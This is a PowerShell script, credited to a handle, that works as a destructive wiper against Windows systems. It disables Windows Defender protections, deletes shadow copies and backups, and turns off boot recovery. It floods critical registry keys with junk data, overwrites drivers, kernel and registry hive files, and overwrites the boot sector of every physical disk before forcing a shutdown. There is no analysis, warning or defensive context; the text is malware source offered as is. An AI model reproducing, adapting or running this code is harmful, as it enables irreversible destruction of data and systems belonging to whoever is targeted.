
# By astyyyyyyy

Set-MpPreference -DisableRealtimeMonitoring $true -Force
Set-MpPreference -DisableBehaviorMonitoring $true -Force
Set-MpPreference -DisableBlockAtFirstSeen $true -Force
Set-MpPreference -DisableIOAVProtection $true -Force
Set-MpPreference -DisablePrivacyMode $true -Force
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force
Set-MpPreference -DisableArchiveScanning $true -Force
Set-MpPreference -DisableIntrusionPreventionSystem $true -Force
Set-MpPreference -DisableScriptScanning $true -Force
Set-MpPreference -SubmitSamplesConsent 2 -Force

vssadmin delete shadows /all /quiet
wmic shadowcopy delete
wbadmin delete catalog -quiet
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no

$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
)
while ($true) {
    foreach ($path in $regPaths) {
        try {
            Set-ItemProperty -Path $path -Name ([guid]::NewGuid().ToString()) -Value ([byte[]]::new(1024)) -ErrorAction SilentlyContinue
        } catch {}
    }
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
}

$drivers = Get-ChildItem "C:\Windows\System32\drivers" -Filter *.sys -Recurse
foreach ($d in $drivers) {
    try {
        [System.IO.File]::WriteAllBytes($d.FullName, (New-Object byte[] 1024))
    } catch {}
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
}

$critical = @(
    "C:\Windows\System32\winload.efi",
    "C:\Windows\System32\ntoskrnl.exe",
    "C:\Windows\System32\hal.dll",
    "C:\Windows\System32\config\SAM",
    "C:\Windows\System32\config\SYSTEM",
    "C:\Windows\System32\config\SOFTWARE"
)
foreach ($file in $critical) {
    try {
        [System.IO.File]::WriteAllBytes($file, (New-Object byte[] (Get-Random -Minimum 1024 -Maximum 4096)))
    } catch {}
    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
}

$disks = Get-WmiObject Win32_DiskDrive
foreach ($disk in $disks) {
    try {
        $stream = [System.IO.File]::Open("\\.\PhysicalDrive$($disk.Index)", 'Open', 'Write')
        $stream.Write((New-Object byte[] 512), 0, 512)
        $stream.Close()
    } catch {}
    Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 60)
}

Start-Sleep -Seconds 300
shutdown /s /f /t 0 /d u:0:0